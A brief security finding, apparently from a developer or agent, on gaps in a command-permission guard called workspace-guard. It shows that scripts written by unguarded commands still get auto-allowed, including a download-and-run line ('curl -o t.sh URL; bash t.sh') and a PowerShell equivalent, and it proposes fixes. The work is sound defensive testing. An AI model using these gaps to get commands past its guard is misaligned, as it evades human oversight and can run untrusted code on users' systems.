# A script written by an unguarded command still vouches

An in-workspace script stops vouching for the blanket `allow` when the same
string writes it, but only the writes workspace-guard already reads count:
redirect targets and the write operands of guarded commands. A command the
guard does not judge can write the script unseen, so
`cat README.md; curl -o t.sh URL; bash t.sh` still returns `allow`, as do
`git checkout`, `tar x`, `unzip` and `patch` in the writer's slot. Measured by
Claude on 2026-11-17 against the fix that introduced the write check.

The PowerShell frontend has the same exemption in `ps_operand_inside` and no
write check at all, so `Set-Content t.py …; python3 t.py` beside a clean
`Get-Content` is the original hole on that side.

Next step: decide whether any unguarded command in the string withholds the
script's vouch (simple, costs a defer on `make build && bash scripts/x.sh`
beside a guarded read) or only a named set of known writers does, then give the
PowerShell side the same `ScriptWrites` tracking.
